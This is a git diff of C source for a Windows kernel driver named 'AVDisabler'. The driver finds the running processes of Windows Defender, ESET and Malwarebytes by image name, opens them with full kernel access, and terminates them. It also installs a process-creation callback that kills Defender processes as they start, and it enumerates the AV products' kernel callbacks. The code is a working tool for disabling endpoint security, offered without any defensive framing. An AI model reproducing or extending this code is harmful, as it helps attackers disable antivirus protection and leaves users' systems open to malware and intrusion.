@@ -330,7 +330,156 @@ NTSTATUS GetFileNameFromPath(IN UNICODE_STRING FullPath, OUT UNICODE_STRING* Fil
 	return STATUS_SUCCESS;
 }
 
-NTSTATUS GetAVPIDs(DWORD32 IOCTL)
+//
+//NTSTATUS GetAVPIDs(DWORD32 IOCTL)
+//{
+//	/*
+//		Need to verify in DriverEntry() that the PIDs are received successfully
+//	*/
+//
+//	typedef NTSTATUS(NTAPI* fNtQuerySystemInformation)(
+//		SYSTEM_INFORMATION_CLASS SystemInformationClass,
+//		PVOID                    SystemInformation,
+//		ULONG                    SystemInformationLength,
+//		PULONG                   ReturnLength);
+//
+//	ULONG len = 0;
+//	SYSTEM_PROCESS_INFORMATION* ProcessInformation = 0;
+//
+//	NTSTATUS status = STATUS_SUCCESS;
+//	UNICODE_STRING NtQuerySystemInformationName = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
+//	UNICODE_STRING FileName;
+//	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)MmGetSystemRoutineAddress(&NtQuerySystemInformationName);
+//	KdPrint(("[+] AVDisabler::GetAVPIDs: NtQuerySystemInformation() address: 0x%p\n", NtQuerySystemInformation));
+//	SYSTEM_PROCESS_INFORMATION* ProcessInfoIter = 0;
+//	switch (IOCTL)
+//	{
+//	/*	ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
+//		status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, SystemProcessInformationSize, &len);
+//		if (status == STATUS_INFO_LENGTH_MISMATCH) {
+//			status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
+//			if (!NT_SUCCESS(status))
+//			{
+//				KdPrint(("[-] AVDisabler::GetAVPIDs: Second Attempt failed with 0x%x\n", status));
+//				return status;
+//			}
+//		}*/
+//
+//		//ProcessInfoIter = ProcessInformation;
+//		//KdPrint(("ProcessInfoIter->NextEntryOffset: 0x%p\n", ProcessInfoIter));
+//		case IOCTL_DISABLE_DEFENDER:
+//		{
+//			ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
+//			status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, SystemProcessInformationSize, &len);
+//			if (status == STATUS_INFO_LENGTH_MISMATCH) {
+//				status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
+//				if(!NT_SUCCESS(status))
+//				{
+//					KdPrint(("[-] AVDisabler::GetAVPIDs - Defender: Second Attempt failed with 0x%x\n", status));
+//					return status;
+//				}
+//			}
+//			ProcessInfoIter = ProcessInformation;
+//			KdPrint(("ProcessInfoIter->NextEntryOffset [IOCTL_DISABLE_DEFENDER]: 0x%p\n", ProcessInfoIter->NextEntryOffset));
+//			while (ProcessInfoIter->NextEntryOffset)
+//			//while (ProcessInfoIter)
+//			{
+//				ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
+//				GetFileNameFromPath(ProcessInfoIter->ImageName, &FileName);
+//				KdPrint(("comparing with: %wZ\n", &ProcessInfoIter->ImageName));
+//				//if (wcscmp(FileName.Buffer, DefenderSecurityHealthService.Buffer) == 0 ||
+//				//	wcscmp(FileName.Buffer, DefenderSecurityHealthSystray.Buffer) == 0 ||
+//				//	wcscmp(FileName.Buffer, DefenderSecurityHealthHost.Buffer) == 0 ||
+//				//	wcscmp(FileName.Buffer, DefenderSecHealthUI.Buffer) == 0 ||
+//				//	wcscmp(FileName.Buffer, DefenderMsMpEng.Buffer) == 0)
+//				
+//				if (wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthService.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthSystray.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthHost.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecHealthUI.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderMsMpEng.Buffer) == 0)
+//				{
+//					g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
+//					g_NumberOfProcesses++;
+//					KdPrint(("[+] AVDisabler::GetAVPIDs - Defender: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
+//				}
+//			}
+//
+//			ExFreePool(ProcessInformation);
+//			return status;
+//		}
+//
+//		case IOCTL_DISABLE_ESET:
+//		{
+//			ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
+//			if (status == STATUS_INFO_LENGTH_MISMATCH)
+//			{
+//				status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
+//				if (!NT_SUCCESS(status))
+//				{
+//					KdPrint(("[-] AVDisabler::GetAVPIDs - ESET: Second Attempt failed with 0x%x\n", status));
+//					return status;
+//				}
+//			}
+//			
+//			ProcessInfoIter = ProcessInformation;
+//			while (ProcessInfoIter->NextEntryOffset)
+//			{
+//				ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
+//				if (wcscmp(ProcessInfoIter->ImageName.Buffer, CallmsiEXE.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, eCaptureEXE.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, eclsEXE.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdEXE.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdsEXE.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, eeclntEXE.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, eguiEXE.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, eguiProxyEXE.Buffer) == 0)
+//				{
+//					g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
+//					g_NumberOfProcesses++;
+//					KdPrint(("[+] AVDisabler::GetAVPIDs - ESET: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
+//				}
+//			}
+//
+//			ExFreePool(ProcessInformation);
+//			return status;
+//		}
+//
+//		case IOCTL_DISABLE_MALWAREBYTES:
+//		{
+//			ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
+//			if (status == STATUS_INFO_LENGTH_MISMATCH)
+//			{
+//				status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
+//				if (!NT_SUCCESS(status))
+//				{
+//					KdPrint(("[-] AVDisabler::GetAVPIDs - MalwareBytes: Second Attempt failed with 0x%x\n", status));
+//					return status;
+//				}
+//			}
+//			ProcessInfoIter = ProcessInformation;
+//			while (ProcessInfoIter->NextEntryOffset)
+//			{
+//				ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
+//				if (wcscmp(ProcessInfoIter->ImageName.Buffer, MalwarebytesEXE.Buffer) == 0 ||
+//					wcscmp(ProcessInfoIter->ImageName.Buffer, MBAMServiceEXE.Buffer) == 0)
+//				{
+//					g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
+//					g_NumberOfProcesses++;
+//					KdPrint(("[+] AVDisabler::GetAVPIDs Malwarebytes: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
+//				}
+//			}
+//
+//			ExFreePool(ProcessInformation);
+//			return status;
+//		}
+//	}
+//	return status;
+//}
+//
+
+//NTSTATUS GetAVPIDs(DWORD32 IOCTL)
+NTSTATUS GetAVPIDs()
 {
 	/*
 		Need to verify in DriverEntry() that the PIDs are received successfully
@@ -352,119 +501,170 @@ NTSTATUS GetAVPIDs(DWORD32 IOCTL)
 	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)MmGetSystemRoutineAddress(&NtQuerySystemInformationName);
 	KdPrint(("[+] AVDisabler::GetAVPIDs: NtQuerySystemInformation() address: 0x%p\n", NtQuerySystemInformation));
 
-	switch (IOCTL)
+	ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
+	status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, SystemProcessInformationSize, &len);
+	if (status == STATUS_INFO_LENGTH_MISMATCH)
 	{
-		case IOCTL_DISABLE_DEFENDER:
+		status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
+		if (!NT_SUCCESS(status))
 		{
-			ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
-			status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, SystemProcessInformationSize, &len);
-			if (status == STATUS_INFO_LENGTH_MISMATCH) {
-				status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
-				if(!NT_SUCCESS(status))
-				{
-					KdPrint(("[-] AVDisabler::GetAVPIDs - Defender: Second Attempt failed with 0x%x\n", status));
-					return status;
-				}
-			}
-
-			ProcessInfoIter = ProcessInformation;
-			KdPrint(("ProcessInfoIter->NextEntryOffset: 0x%p\n", ProcessInfoIter));
-			while (ProcessInfoIter->NextEntryOffset)
-			{
-				ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
-				GetFileNameFromPath(ProcessInfoIter->ImageName, &FileName);
-				KdPrint(("comparing with: %wZ\n", &ProcessInfoIter->ImageName));
-				//if (wcscmp(FileName.Buffer, DefenderSecurityHealthService.Buffer) == 0 ||
-				//	wcscmp(FileName.Buffer, DefenderSecurityHealthSystray.Buffer) == 0 ||
-				//	wcscmp(FileName.Buffer, DefenderSecurityHealthHost.Buffer) == 0 ||
-				//	wcscmp(FileName.Buffer, DefenderSecHealthUI.Buffer) == 0 ||
-				//	wcscmp(FileName.Buffer, DefenderMsMpEng.Buffer) == 0)
-				
-				if (wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthService.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthSystray.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthHost.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecHealthUI.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderMsMpEng.Buffer) == 0)
-				{
-					g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
-					g_NumberOfProcesses++;
-					KdPrint(("[+] AVDisabler::GetAVPIDs - Defender: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
-				}
-			}
-
-			ExFreePool(ProcessInformation);
-			return status;
-		}
-
-		case IOCTL_DISABLE_ESET:
-		{
-			ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
-			if (status == STATUS_INFO_LENGTH_MISMATCH)
-			{
-				status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
-				if (!NT_SUCCESS(status))
-				{
-					KdPrint(("[-] AVDisabler::GetAVPIDs - ESET: Second Attempt failed with 0x%x\n", status));
-					return status;
-				}
-			}
-
-			ProcessInfoIter = ProcessInformation;
-			while (ProcessInfoIter->NextEntryOffset)
-			{
-				ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
-				if (wcscmp(ProcessInfoIter->ImageName.Buffer, CallmsiEXE.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, eCaptureEXE.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, eclsEXE.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdEXE.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdsEXE.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, eeclntEXE.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, eguiEXE.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, eguiProxyEXE.Buffer) == 0)
-				{
-					g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
-					g_NumberOfProcesses++;
-					KdPrint(("[+] AVDisabler::GetAVPIDs - ESET: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
-				}
-			}
-
-			ExFreePool(ProcessInformation);
-			return status;
-		}
-
-		case IOCTL_DISABLE_MALWAREBYTES:
-		{
-			ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
-			if (status == STATUS_INFO_LENGTH_MISMATCH)
-			{
-				status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
-				if (!NT_SUCCESS(status))
-				{
-					KdPrint(("[-] AVDisabler::GetAVPIDs - MalwareBytes: Second Attempt failed with 0x%x\n", status));
-					return status;
-				}
-			}
-			ProcessInfoIter = ProcessInformation;
-			while (ProcessInfoIter->NextEntryOffset)
-			{
-				ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
-				if (wcscmp(ProcessInfoIter->ImageName.Buffer, MalwarebytesEXE.Buffer) == 0 ||
-					wcscmp(ProcessInfoIter->ImageName.Buffer, MBAMServiceEXE.Buffer) == 0)
-				{
-					g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
-					g_NumberOfProcesses++;
-					KdPrint(("[+] AVDisabler::GetAVPIDs Malwarebytes: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
-				}
-			}
-
-			ExFreePool(ProcessInformation);
+			KdPrint(("[-] AVDisabler::GetAVPIDs - Defender: Second Attempt failed with 0x%x\n", status));
 			return status;
 		}
 	}
+
+	ProcessInfoIter = ProcessInformation;
+	KdPrint(("ProcessInfoIter->NextEntryOffset: 0x%p\n", ProcessInfoIter->NextEntryOffset));
+
+	while (ProcessInfoIter->NextEntryOffset)
+	{
+		ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
+		GetFileNameFromPath(ProcessInfoIter->ImageName, &FileName);
+		//KdPrint(("comparing with: %wZ\n", &ProcessInfoIter->ImageName));
+
+		if (wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthService.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthSystray.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthHost.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecHealthUI.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderMsMpEng.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, CallmsiEXE.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, eCaptureEXE.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, eclsEXE.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdEXE.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdsEXE.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, eeclntEXE.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, eguiEXE.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, eguiProxyEXE.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, MalwarebytesEXE.Buffer) == 0 ||
+			wcscmp(ProcessInfoIter->ImageName.Buffer, MBAMServiceEXE.Buffer) == 0)
+		{
+			g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
+			g_NumberOfProcesses++;
+			KdPrint(("[+] AVDisabler::GetAVPIDs - Defender: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
+		}
+	}
+
+	ExFreePool(ProcessInformation);
 	return status;
+
+	//switch (IOCTL)
+	//{
+	//case IOCTL_DISABLE_DEFENDER:
+	//{
+	//	ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
+	//	status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, SystemProcessInformationSize, &len);
+	//	if (status == STATUS_INFO_LENGTH_MISMATCH) {
+	//		status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
+	//		if (!NT_SUCCESS(status))
+	//		{
+	//			KdPrint(("[-] AVDisabler::GetAVPIDs - Defender: Second Attempt failed with 0x%x\n", status));
+	//			return status;
+	//		}
+	//	}
+	//
+	//	ProcessInfoIter = ProcessInformation;
+	//	KdPrint(("ProcessInfoIter->NextEntryOffset: 0x%p\n", ProcessInfoIter->NextEntryOffset));
+	//	while (ProcessInfoIter->NextEntryOffset)
+	//	{
+	//		ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
+	//		GetFileNameFromPath(ProcessInfoIter->ImageName, &FileName);
+	//		//KdPrint(("comparing with: %wZ\n", &ProcessInfoIter->ImageName));
+	//
+	//		if (wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthService.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthSystray.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthHost.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecHealthUI.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderMsMpEng.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, CallmsiEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eCaptureEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eclsEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdsEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eeclntEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eguiEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eguiProxyEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, MalwarebytesEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, MBAMServiceEXE.Buffer) == 0)
+	//		{
+	//			g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
+	//			g_NumberOfProcesses++;
+	//			KdPrint(("[+] AVDisabler::GetAVPIDs - Defender: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
+	//		}
+	//	}
+	//
+	//	ExFreePool(ProcessInformation);
+	//	return status;
+	//}
+	//
+	//case IOCTL_DISABLE_ESET:
+	//{
+	//	ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
+	//	if (status == STATUS_INFO_LENGTH_MISMATCH)
+	//	{
+	//		status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
+	//		if (!NT_SUCCESS(status))
+	//		{
+	//			KdPrint(("[-] AVDisabler::GetAVPIDs - ESET: Second Attempt failed with 0x%x\n", status));
+	//			return status;
+	//		}
+	//	}
+	//
+	//	ProcessInfoIter = ProcessInformation;
+	//	while (ProcessInfoIter->NextEntryOffset)
+	//	{
+	//		ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
+	//		if (wcscmp(ProcessInfoIter->ImageName.Buffer, CallmsiEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eCaptureEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eclsEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdsEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eeclntEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eguiEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, eguiProxyEXE.Buffer) == 0)
+	//		{
+	//			g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
+	//			g_NumberOfProcesses++;
+	//			KdPrint(("[+] AVDisabler::GetAVPIDs - ESET: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
+	//		}
+	//	}
+	//
+	//	ExFreePool(ProcessInformation);
+	//	return status;
+	//}
+	//
+	//case IOCTL_DISABLE_MALWAREBYTES:
+	//{
+	//	ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
+	//	if (status == STATUS_INFO_LENGTH_MISMATCH)
+	//	{
+	//		status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);
+	//		if (!NT_SUCCESS(status))
+	//		{
+	//			KdPrint(("[-] AVDisabler::GetAVPIDs - MalwareBytes: Second Attempt failed with 0x%x\n", status));
+	//			return status;
+	//		}
+	//	}
+	//	ProcessInfoIter = ProcessInformation;
+	//	while (ProcessInfoIter->NextEntryOffset)
+	//	{
+	//		ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
+	//		if (wcscmp(ProcessInfoIter->ImageName.Buffer, MalwarebytesEXE.Buffer) == 0 ||
+	//			wcscmp(ProcessInfoIter->ImageName.Buffer, MBAMServiceEXE.Buffer) == 0)
+	//		{
+	//			g_PIDs[g_NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
+	//			g_NumberOfProcesses++;
+	//			KdPrint(("[+] AVDisabler::GetAVPIDs Malwarebytes: Found %wZ | PID: %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
+	//		}
+	//	}
+	//
+	//	ExFreePool(ProcessInformation);
+	//	return status;
+	//}
+	//}
+	//return status;
 }
 
-NTSTATUS TerminateAVProcesses(DWORD32 IOCTL)
+NTSTATUS TerminateAVProcesses()
 {
 	typedef NTSTATUS(NTAPI* fPsLookupProcessByProcessId)(
 		HANDLE ProcessId,
@@ -480,6 +680,8 @@ NTSTATUS TerminateAVProcesses(DWORD32 IOCTL)
 		PHANDLE         Handle
 		);
 
+	KdPrint(("In TerminateAVProcesses...\n"));
+
 	int counter = 0;
 	NTSTATUS status = STATUS_SUCCESS;
 	PEPROCESS PEprocess = 0;
@@ -491,47 +693,38 @@ NTSTATUS TerminateAVProcesses(DWORD32 IOCTL)
 	fPsLookupProcessByProcessId PsLookupProcessByProcessId = (fPsLookupProcessByProcessId)MmGetSystemRoutineAddress(&PsLookupProcessByProcessIdName);
 	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerName);
 	
-	KdPrint(("[*] ObOpenObjectByPointer() address: 0x%p\n", ObOpenObjectByPointer));;
-	KdPrint(("[*] PsLookupProcessByProcessId() address: 0x%p\n", PsLookupProcessByProcessId));;
-
-	switch (IOCTL)
-	{
-		case IOCTL_DISABLE_ESET:
-			GetAVPIDs(IOCTL_DISABLE_ESET);
-
-		case IOCTL_DISABLE_MALWAREBYTES:
-			GetAVPIDs(IOCTL_DISABLE_MALWAREBYTES);
-
-		case IOCTL_DISABLE_DEFENDER:
-			GetAVPIDs(IOCTL_DISABLE_DEFENDER);
-	}
+	KdPrint(("[*] ObOpenObjectByPointer() address: 0x%p\n", ObOpenObjectByPointer));
+	KdPrint(("[*] PsLookupProcessByProcessId() address: 0x%p\n", PsLookupProcessByProcessId));
 
 	for (int i = 0; i < g_NumberOfProcesses; i++)
 	{
 		status = PsLookupProcessByProcessId(UlongToHandle(g_PIDs[i]), &PEprocess);
 		if (!NT_SUCCESS(status))
 		{
-			KdPrint(("[-] AVDisabler::TerminateAVProcess - IOCTL_DISABLE_DEFENDER: PsLookupProcessByProcessId() FAILED: 0x%x\n", status));
+			KdPrint(("[-] AVDisabler::TerminateAVProcess PsLookupProcessByProcessId() FAILED: 0x%x\n", status));
 			continue;
 		}
 
-		KdPrint(("[+] AVDisabler::TerminateAVProcess - IOCTL_DISABLE_DEFENDER: 0x%p\n", PEprocess));
+		//KdPrint(("[+] AVDisabler::TerminateAVProcess: 0x%p\n", PEprocess));
 
 		status = ObOpenObjectByPointer(PEprocess, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
 		if (hProcess == UlongToHandle(INVALID_KERNEL_HANDLE))
 		{
-			KdPrint(("[-] AVDisabler::TerminateAVProcesses - IOCTL_DISABLE_DEFENDER: ObOpenObjectByPointer() failed (0x%x) continuing...\n", status));
+			KdPrint(("[-] AVDisabler::TerminateAVProcesses: ObOpenObjectByPointer() failed (0x%x) continuing...\n", status));
 			continue;
 		}
-		KdPrint(("[+] AVDisabler::TerminateAVProcesses - IOCTL_DISABLE_DEFENDER: Handle 0x%x opened successfully!\n", hProcess));
+		KdPrint(("[+] AVDisabler::TerminateAVProcesse: Handle 0x%x opened successfully!\n", hProcess));
 
 		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_DENIED);
 		if (!NT_SUCCESS(status))
 		{
-			KdPrint(("[-] AVDisabler::TerminateAVProcesses - IOCTL_DISABLE_DEFENDER: ZwTerminateProcess() failed with 0x%x\n", status));
+			KdPrint(("[-] AVDisabler::TerminateAVProcesses: ZwTerminateProcess() failed with 0x%x\n", status));
+			g_PIDs[i] = 0;
 			continue;
 		}
-		KdPrint(("[+] AVDisabler::TerminateAVProcesses - IOCTL_DISABLE_DEFENDER: successfully terminated: 0x%d", g_PIDs[i]));
+
+		KdPrint(("[+] AVDisabler::TerminateAVProcesses: successfully terminated: 0x%d\n", g_PIDs[i]));
+		g_PIDs[i] = 0;
 	}
 
 	return status;
@@ -549,13 +742,16 @@ void PreventDefenderProcessCreate(PEPROCESS Process,
 		fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
 		KdPrint(("[+]AVDisablerDriver::PreventDefenderProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));
 
+		//KdPrint(("[*] AVDisabler::PreventDefenderProcessCreate: ImageName: %wZ\n", CreateInfo->ImageFileName));
+
 		UNICODE_STRING ImageFileName;
 		status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
 		if (!NT_SUCCESS(status))
 		{
-			KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
+			KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
 			return;
 		}
+		//KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate:GetFileNameFromPath: %wZ\n", &ImageFileName));
 		// checking if the process being created is one of defender's processes
 		if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
 			RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
@@ -575,12 +771,10 @@ void PreventDefenderProcessCreate(PEPROCESS Process,
 			if (!NT_SUCCESS(status))
 			{
 				KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
-				//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
 				return;
 			}
 
 			KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
-
 		}
 	}
 }
@@ -862,6 +1056,18 @@ NTSTATUS EnumerateAVCallbackRoutinesBaseAddress(ULONG_PTR* PspCreateProcessNotif
 	return STATUS_SUCCESS;
 }
 
+
+/*
+// Eset Processes
+UNICODE_STRING CallmsiEXE = RTL_CONSTANT_STRING(L"callmsi.exe");
